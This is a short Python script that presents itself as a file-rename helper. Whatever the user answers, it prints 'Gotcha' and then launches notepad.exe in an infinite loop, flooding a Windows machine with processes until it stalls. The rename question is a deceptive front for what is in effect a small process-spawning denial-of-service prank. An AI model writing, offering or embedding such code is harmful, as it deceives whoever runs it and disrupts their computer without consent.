import subprocess


def spam():
    print("Gotcha")
    while True:
        subprocess.Popen('C:\\Windows\\System32\\notepad.exe')


def main():
    rinomina = input("Do you want to rename a file? (yes, no) ")

    if rinomina in ("yes", "no", "Yes", "No"):
        spam()
    else:
        spam()


if __name__ == "__main__":
    main()
